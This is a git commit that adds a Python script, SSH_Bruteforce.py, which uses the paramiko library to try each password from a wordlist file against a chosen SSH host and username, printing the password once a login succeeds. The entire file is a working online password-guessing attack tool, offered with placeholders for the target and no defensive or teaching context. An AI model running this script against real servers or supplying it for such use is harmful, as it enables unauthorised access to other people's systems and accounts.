f9fa2e0caf97e538bcb765848e4aa21bfd7ee9bd
Dharmik Kantesaria <61052887+dharmikkantesaria@users.noreply.github.com>
2024-08-26 21:35:05 -0700

    Add files via upload

---
+++ SSH_Bruteforce.py
@@ -0,0 +1,33 @@
+####################
+#Brute Force SSH creds
+#
+#This script will require a target IP, username and password list. 
+#This script will need root privileges to run succesfully.
+####################
+
+import paramiko
+host = "target_ip" # enter target IP address here.
+user = "username" # enter the username to brute force the password.
+def sshbrute(loginPass):
+   
+ 
+    with paramiko.SSHClient() as client:
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        try:
+            client.connect(host, username=user, password=loginPass, timeout=5)
+            return loginPass  # Return the password if successfully connected
+        except Exception:
+            pass
+ 
+loginPasslist = []
+with open("pass.txt", "r") as f:    #replace your "pass.txt" with your password list.
+    loginPasslist = [line.strip() for line in f.readlines()]
+print(f"Brute forcing the ssh service at {host} now...")
+for passwd in loginPasslist:
+    #print(passwd)
+    found_password = sshbrute(passwd)
+    if found_password:
+        print(f"The password for the user {user} at ip {host} is: {found_password}")
+        break
+else:
+    print("Password not found.")
